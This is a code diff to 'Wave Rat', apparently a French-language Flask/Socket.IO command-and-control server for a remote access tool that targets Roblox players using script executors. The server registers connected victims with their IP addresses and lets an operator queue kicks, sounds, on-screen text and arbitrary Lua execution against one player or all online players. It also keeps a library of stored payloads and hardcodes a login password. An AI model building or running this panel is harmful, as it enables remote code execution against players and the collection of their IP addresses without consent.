@@ -17,8 +17,8 @@ app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet", logger=True, engineio_logger=True)
 
 # ==================== CONFIG ====================
-LOGIN = "entrepreneur1337"          # À CHANGER
-PASSWORD = "A9f!Q3r#Zx7L"           # À CHANGER
+LOGIN = "entrepreneur1337"          # ← À CHANGER
+PASSWORD = "A9f!Q3r#Zx7L"           # ← À CHANGER
 SESSION_DURATION = 24 * 3600
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
@@ -166,7 +166,7 @@ def add_history(event_type, username, details=""):
         pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ==================== HTML DASHBOARD ====================
+# ==================== DASHBOARD HTML ====================
 HTML = """<!DOCTYPE html>
 <html lang="fr" class="dark">
 <head>
@@ -366,19 +366,21 @@ const socket = io({transports: ['websocket', 'polling']});
 let currentPlayerId = null;
 let editingPayloadName = null;
 
-console.log("Dashboard chargé - tentative de connexion Socket.IO...");
+console.log("Wave Rat Dashboard chargé");
 
-socket.on('connect', () => console.log("Socket.IO connecté avec succès"));
-socket.on('connect_error', err => console.error("Erreur Socket.IO :", err));
-socket.on('disconnect', reason => console.log("Socket.IO déconnecté :", reason));
+// Connexion Socket
+socket.on('connect', () => console.log("Socket connecté"));
+socket.on('connect_error', err => console.error("Erreur Socket :", err));
+socket.on('disconnect', reason => console.log("Socket déconnecté :", reason));
 
-document.querySelectorAll('.nav-item').forEach(i => {
-    i.addEventListener('click', () => {
-        document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active'));
-        document.querySelectorAll('.tab').forEach(x => x.style.display = 'none');
-        i.classList.add('active');
-        document.getElementById(i.dataset.tab + '-tab').style.display = 'block';
-        if (i.dataset.tab === 'workshop') loadPayloads();
+// Navigation
+document.querySelectorAll('.nav-item').forEach(item => {
+    item.addEventListener('click', () => {
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+        document.querySelectorAll('.tab').forEach(t => t.style.display = 'none');
+        item.classList.add('active');
+        document.getElementById(item.dataset.tab + '-tab').style.display = 'block';
+        if (item.dataset.tab === 'workshop') loadPayloads();
     });
 });
 
@@ -391,59 +393,220 @@ function toast(msg) {
 }
 
 function filterPlayers() {
-    const q = document.getElementById('searchInput').value.toLowerCase();
+    const q = document.getElementById('searchInput')?.value?.toLowerCase() || '';
     document.querySelectorAll('.card').forEach(c => {
         c.style.display = c.textContent.toLowerCase().includes(q) ? 'block' : 'none';
     });
 }
 
-// Fonctions workshop (simplifiées ici - ajoute le reste si besoin)
+// ==================== PAYLOADS ====================
 function loadPayloads() {
-    fetch('/payload?action=list').then(r => r.json()).then(data => {
-        const list = document.getElementById('payloads-list');
-        list.innerHTML = Object.keys(data).length === 0 ? '<p style="color:#94a3b8;padding:20px;">Aucun payload</p>' : '';
-        for (const [name, code] of Object.entries(data)) {
-            const div = document.createElement('div');
-            div.style = 'background:#1e293b;padding:15px;border-radius:12px;margin-bottom:10px;';
-            div.innerHTML = `
-                <strong>${name}</strong><br>
-                <span style="font-size:0.8rem;color:#94a3b8">${code.slice(0,100)}${code.length>100?'...':''}</span>
-                <div style="margin-top:10px;">
-                    <button class="btn" style="padding:6px 12px;font-size:0.8rem;" onclick="editPayload('${name}')">Edit</button>
-                    <button class="btn kick" style="padding:6px 12px;font-size:0.8rem;" onclick="deletePayload('${name}')">Suppr</button>
-                </div>`;
-            list.appendChild(div);
-        }
+    fetch('/payload?action=list')
+        .then(r => r.json())
+        .then(data => {
+            const container = document.getElementById('payloads-list');
+            container.innerHTML = '';
+            if (Object.keys(data).length === 0) {
+                container.innerHTML = '<p style="color:#94a3b8;padding:20px;">Aucun payload</p>';
+                return;
+            }
+            Object.entries(data).forEach(([name, code]) => {
+                const div = document.createElement('div');
+                div.style = 'background:#1e293b;padding:15px;border-radius:12px;margin-bottom:10px;';
+                div.innerHTML = `
+                    <strong>${name}</strong><br>
+                    <span style="font-size:0.8rem;color:#94a3b8">${code.substring(0,100)}${code.length>100?'...':''}</span>
+                    <div style="margin-top:10px;display:flex;gap:8px;">
+                        <button class="btn" style="padding:6px 12px;font-size:0.8rem;" onclick="editPayload('${name.replace(/'/g,"\\'")}')">Edit</button>
+                        <button class="btn kick" style="padding:6px 12px;font-size:0.8rem;" onclick="deletePayload('${name.replace(/'/g,"\\'")}')">Suppr</button>
+                    </div>`;
+                container.appendChild(div);
+            });
+        })
+        .catch(err => {
+            console.error(err);
+            toast("Erreur chargement payloads");
+        });
+}
+
+window.editPayload = name => {
+    fetch(`/payload?action=get&name=${encodeURIComponent(name)}`)
+        .then(r => r.json())
+        .then(d => {
+            editingPayloadName = name;
+            document.getElementById('payloadModalTitle').textContent = 'Modifier Payload';
+            document.getElementById('payloadName').value = name;
+            document.getElementById('payloadCode').value = d.code || '';
+            document.getElementById('payloadModal').classList.add('active');
+        })
+        .catch(() => toast("Erreur chargement payload"));
+};
+
+window.deletePayload = name => {
+    if (!confirm(`Supprimer "${name}" ?`)) return;
+    fetch('/payload', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({action:'delete', name})
+    })
+    .then(() => {
+        toast('Payload supprimé');
+        loadPayloads();
+    })
+    .catch(() => toast('Erreur suppression'));
+};
+
+document.getElementById('newPayloadBtn').onclick = () => {
+    editingPayloadName = null;
+    document.getElementById('payloadModalTitle').textContent = 'Nouveau Payload';
+    document.getElementById('payloadName').value = '';
+    document.getElementById('payloadCode').value = '';
+    document.getElementById('payloadModal').classList.add('active');
+};
+
+document.getElementById('savePayload').onclick = () => {
+    const name = document.getElementById('payloadName').value.trim();
+    const code = document.getElementById('payloadCode').value.trim();
+    if (!name || !code) return toast('Nom et code requis');
+    
+    const payload = {
+        action: editingPayloadName ? 'update' : 'create',
+        name,
+        code,
+        oldname: editingPayloadName || undefined
+    };
+
+    fetch('/payload', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(payload)
+    })
+    .then(() => {
+        toast(editingPayloadName ? 'Modifié' : 'Créé');
+        document.getElementById('payloadModal').classList.remove('active');
+        loadPayloads();
+    })
+    .catch(() => toast('Erreur sauvegarde'));
+};
+
+// ==================== PAYLOAD POUR JOUEUR ====================
+window.openPayloadSelector = id => {
+    currentPlayerId = id;
+    fetch('/payload?action=list')
+        .then(r => r.json())
+        .then(data => {
+            const list = document.getElementById('payloadList');
+            list.innerHTML = '';
+            if (Object.keys(data).length === 0) {
+                list.innerHTML = '<p style="color:#94a3b8;text-align:center;padding:20px;">Aucun payload</p>';
+            } else {
+                Object.keys(data).forEach(name => {
+                    const item = document.createElement('div');
+                    item.className = 'payload-item';
+                    item.textContent = name;
+                    item.onclick = () => {
+                        document.querySelectorAll('.payload-item').forEach(el => el.classList.remove('selected'));
+                        item.classList.add('selected');
+                        fetch(`/payload?action=get&name=${encodeURIComponent(name)}`)
+                            .then(r => r.json())
+                            .then(d => document.getElementById('tempPayloadCode').value = d.code || '');
+                    };
+                    list.appendChild(item);
+                });
+            }
+            document.getElementById('executePayloadModal').classList.add('active');
+        })
+        .catch(() => toast('Erreur chargement payloads'));
+};
+
+function filterPayloads() {
+    const q = document.getElementById('payloadSearch').value.toLowerCase();
+    document.querySelectorAll('.payload-item').forEach(i => {
+        i.style.display = i.textContent.toLowerCase().includes(q) ? '' : 'none';
     });
 }
 
-// ... (ajoute editPayload, deletePayload, savePayload, openPayloadSelector, etc. si tu les utilises)
+document.getElementById('executeTempPayload').onclick = () => {
+    const code = document.getElementById('tempPayloadCode').value.trim();
+    if (!code) return toast('Aucun code');
+    sendTroll(currentPlayerId, 'luaexec', code);
+    document.getElementById('executePayloadModal').classList.remove('active');
+};
 
+// ==================== FONCTIONS COMMUNES ====================
+function sendTroll(id, cmd, param = null) {
+    const body = { userid: id, cmd };
+    if (param !== null) {
+        if (cmd === 'playsound') body.assetId = param;
+        else if (cmd === 'textscreen') body.text = param;
+        else if (cmd === 'luaexec') body.script = param;
+    }
+    fetch('/troll', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(body)
+    });
+    toast(`${cmd.toUpperCase()} envoyé`);
+}
+
+// Modals classiques (exemples)
+function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
+function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
+function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
+function openLuaExecModal(id) { currentPlayerId = id; document.getElementById('luaExecModal').classList.add('active'); }
+function openImportFileModal(id) { currentPlayerId = id; document.getElementById('importFileModal').classList.add('active'); }
+
+document.querySelectorAll('.modal .cancel').forEach(btn => {
+    btn.addEventListener('click', () => btn.closest('.modal').classList.remove('active'));
+});
+
+// Exec All
+document.getElementById('execAllBtn').onclick = () => {
+    document.getElementById('execAllScript').value = '';
+    document.getElementById('execAllModal').classList.add('active');
+};
+
+document.getElementById('confirmExecAll').onclick = () => {
+    const script = document.getElementById('execAllScript').value.trim();
+    if (!script) return toast('Script vide');
+    fetch('/exec_all', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({script})
+    })
+    .then(r => r.json())
+    .then(d => {
+        if (d.sent) toast(`Envoyé à ${d.count} joueur(s)`);
+        else toast('Erreur');
+        document.getElementById('execAllModal').classList.remove('active');
+    });
+};
+
+// ==================== RENDU ====================
 function render(data) {
-    console.log("Données reçues via 'update' :", data);
+    console.log('Update reçu :', data);
 
-    if (!data || typeof data !== 'object') return;
+    if (!data) return;
 
     document.getElementById('stats-online').innerText = data.online || 0;
     document.getElementById('stats-peak').innerText = data.peak || 0;
     document.getElementById('stats-total').innerText = data.total_exec || 0;
 
     const grid = document.getElementById('players');
-    const noPlayersMsg = document.getElementById('noPlayersMsg');
+    const noMsg = document.getElementById('noPlayersMsg');
 
     if (!data.players || Object.keys(data.players).length === 0) {
         grid.innerHTML = '';
-        noPlayersMsg.style.display = 'block';
+        noMsg.style.display = 'block';
         return;
     }
 
-    noPlayersMsg.style.display = 'none';
+    noMsg.style.display = 'none';
 
-    const currentIds = new Set(Object.keys(data.players));
+    const current = new Set(Object.keys(data.players));
 
-    document.querySelectorAll('.card').forEach(card => {
-        const id = card.id.replace('card_', '');
-        if (!currentIds.has(id)) card.remove();
+    document.querySelectorAll('.card').forEach(c => {
+        if (!current.has(c.id.replace('card_', ''))) c.remove();
     });
 
     Object.entries(data.players).forEach(([id, p]) => {
@@ -455,14 +618,14 @@ function render(data) {
             grid.appendChild(card);
         }
 
-        const isOnline = !!p.online;
+        const online = !!p.online;
         card.innerHTML = `
-            <div class="status"><div class="dot ${isOnline?'online':''}"></div><span>${isOnline?'Online':'Offline'}</span></div>
+            <div class="status"><div class="dot ${online?'online':''}"></div><span>${online?'Online':'Offline'}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username || 'Inconnu'}</a> (${id})</div>
             <div class="info">
                 Executor: ${p.executor || '?'}<br>
                 IP: ${p.ip || '?'}<br>
-                Game: <a href="https://www.roblox.com/games/${p.gameId || 0}" target="_blank">${p.game || 'N/A'}</a><br>
+                Game: <a href="https://www.roblox.com/games/${p.gameId||0}" target="_blank">${p.game || 'N/A'}</a><br>
                 JobId: ${p.jobId || 'N/A'}
             </div>
             <div class="category">TROLLS</div>
@@ -496,55 +659,12 @@ function render(data) {
     });
 }
 
-// Fonctions modal classiques (simplifiées)
-function openKickModal(id) { currentPlayerId = id; document.getElementById('kickModal').classList.add('active'); }
-function openPlaySoundModal(id) { currentPlayerId = id; document.getElementById('playSoundModal').classList.add('active'); }
-function openTextScreenModal(id) { currentPlayerId = id; document.getElementById('textScreenModal').classList.add('active'); }
-function openLuaExecModal(id) { currentPlayerId = id; document.getElementById('luaExecModal').classList.add('active'); }
-function openImportFileModal(id) { currentPlayerId = id; document.getElementById('importFileModal').classList.add('active'); }
-
-document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener('click', () => b.closest('.modal').classList.remove('active')));
-
-function sendTroll(id, cmd, param = null) {
-    const body = { userid: id, cmd };
-    if (param) {
-        if (cmd === 'playsound') body.assetId = param;
-        else if (cmd === 'textscreen') body.text = param;
-        else if (cmd === 'luaexec') body.script = param;
-    }
-    fetch('/troll', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body) });
-    toast(cmd.toUpperCase() + ' envoyé');
-}
-
-// ... (ajoute confirmKick, confirmSound, confirmText, confirmLua, confirmImport si besoin)
-
-document.getElementById('execAllBtn').onclick = () => {
-    document.getElementById('execAllScript').value = '';
-    document.getElementById('execAllModal').classList.add('active');
-};
-
-document.getElementById('confirmExecAll').onclick = () => {
-    const script = document.getElementById('execAllScript').value.trim();
-    if (!script) return toast('Script vide');
-    fetch('/exec_all', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({script})
-    })
-    .then(r => r.json())
-    .then(d => {
-        if (d.sent) toast(`Envoyé à ${d.count} joueur(s)`);
-        else toast('Erreur');
-        document.getElementById('execAllModal').classList.remove('active');
-    })
-    .catch(() => toast('Erreur réseau'));
-};
-
 socket.on('update', render);
 socket.on('history_update', d => {
     document.getElementById('history').innerHTML = d.history.map(h => 
         `<div style="background:#1e293b;padding:12px;border-radius:12px;margin-bottom:8px;">
-            <strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span>
+            <strong>[${h.time}] ${h.username}</strong><br>
+            <span style="color:#94a3b8">${h.details}</span>
         </div>`
     ).join('');
 });
@@ -552,7 +672,7 @@ socket.on('history_update', d => {
 </body>
 </html>"""
 
-# ==================== ROUTES API ====================
+# ==================== ROUTES ====================
 @app.route("/")
 @require_auth
 def index():
@@ -570,28 +690,28 @@ def api():
 
     if request.method == "POST":
         try:
-            d = request.get_json(silent=True) or {}
-            uid = str(d.get("userid", ""))
-            action = d.get("action")
+            data = request.get_json(silent=True) or {}
+            uid = str(data.get("userid", ""))
+            action = data.get("action")
 
             if action == "register" and uid:
                 connected_players[uid] = {
-                    "username": d.get("username", "Unknown"),
-                    "executor": d.get("executor", "Unknown"),
-                    "ip": d.get("ip", "Unknown"),
+                    "username": data.get("username", "Unknown"),
+                    "executor": data.get("executor", "Unknown"),
+                    "ip": data.get("ip", "Unknown"),
                     "last": now,
                     "online": True,
-                    "game": d.get("game", "Unknown"),
-                    "gameId": d.get("gameId", 0),
-                    "jobId": d.get("jobId", "Unknown")
+                    "game": data.get("game", "Unknown"),
+                    "gameId": data.get("gameId", 0),
+                    "jobId": data.get("jobId", "Unknown")
                 }
-                add_history("connect", connected_players[uid]["username"], f"Connecté depuis {d.get('game', '?')}")
+                add_history("connect", connected_players[uid]["username"], f"Connecté depuis {data.get('game', '?')}")
             elif action == "heartbeat" and uid in connected_players:
                 connected_players[uid]["last"] = now
                 total_executions += 1
 
         except Exception as e:
-            print("Erreur /api POST :", str(e))
+            print(f"Erreur POST /api : {e}")
 
         return jsonify({"ok": True})
 
@@ -607,9 +727,9 @@ def api():
         cmd = pending_commands.pop(uid)
         res = {"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd}
         if isinstance(cmd, dict):
-            for k in ["assetId", "text", "script"]:
-                if k in cmd:
-                    res[k] = cmd[k]
+            for key in ["assetId", "text", "script"]:
+                if key in cmd:
+                    res[key] = cmd[key]
         return jsonify(res)
 
     return jsonify({})
@@ -654,7 +774,7 @@ def exec_all():
         return jsonify({"error": "Script vide"}), 400
 
     count = 0
-    for uid in list(connected_players):
+    for uid in list(connected_players.keys()):
         if connected_players[uid].get("online", False):
             pending_commands[uid] = {"cmd": "luaexec", "script": script}
             count += 1
@@ -665,27 +785,36 @@ def exec_all():
 
 @app.route("/payload", methods=["GET", "POST"])
 @require_auth
-def payload_manager():
+def payload():
     if request.method == "GET":
         action = request.args.get("action")
-        if action == "list": return jsonify(payloads)
-        if action == "get": return jsonify({"code": payloads.get(request.args.get("name", ""), "")})
-    else:
-        data = request.get_json() or {}
-        action = data.get("action")
-        if action == "create":
-            payloads[data["name"]] = data["code"]
-        elif action == "update":
-            if data.get("oldname") and data["oldname"] in payloads:
-                del payloads[data["oldname"]]
-            payloads[data["name"]] = data["code"]
-        elif action == "delete":
-            payloads.pop(data.get("name"), None)
-        save_payloads()
-        return jsonify({"ok": True})
-    return jsonify({"error": "requête invalide"})
+        if action == "list":
+            return jsonify(payloads)
+        if action == "get":
+            name = request.args.get("name", "")
+            return jsonify({"code": payloads.get(name, "")})
+        return jsonify({"error": "action invalide"})
 
-# ==================== BOUCLE DE FOND ====================
+    # POST
+    data = request.get_json() or {}
+    action = data.get("action")
+
+    if action == "create":
+        payloads[data["name"]] = data["code"]
+    elif action == "update":
+        old = data.get("oldname")
+        if old and old in payloads:
+            del payloads[old]
+        payloads[data["name"]] = data["code"]
+    elif action == "delete":
+        payloads.pop(data.get("name"), None)
+    else:
+        return jsonify({"error": "action invalide"}), 400
+
+    save_payloads()
+    return jsonify({"ok": True})
+
+# ==================== BOUCLE ====================
 def broadcast_loop():
     global peak_players
     while True:
@@ -697,9 +826,9 @@ def broadcast_loop():
             if now - p["last"] > 30:
                 to_remove.append(uid)
             else:
-                was = p.get("online", False)
+                was_online = p.get("online", False)
                 p["online"] = now - p["last"] < 15
-                if was and not p["online"]:
+                if was_online and not p["online"]:
                     add_history("disconnect", p["username"], "Perdu")
                 if p["online"]:
                     online += 1
@@ -722,8 +851,7 @@ def broadcast_loop():
 
         socketio.sleep(3)
 
-# ==================== DÉMARRAGE ====================
 if __name__ == "__main__":
-    print("Démarrage Wave Rat sur http://0.0.0.0:5000")
+    print("Wave Rat démarré → http://0.0.0.0:5000")
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000, allow_unsafe_werkzeug=True)
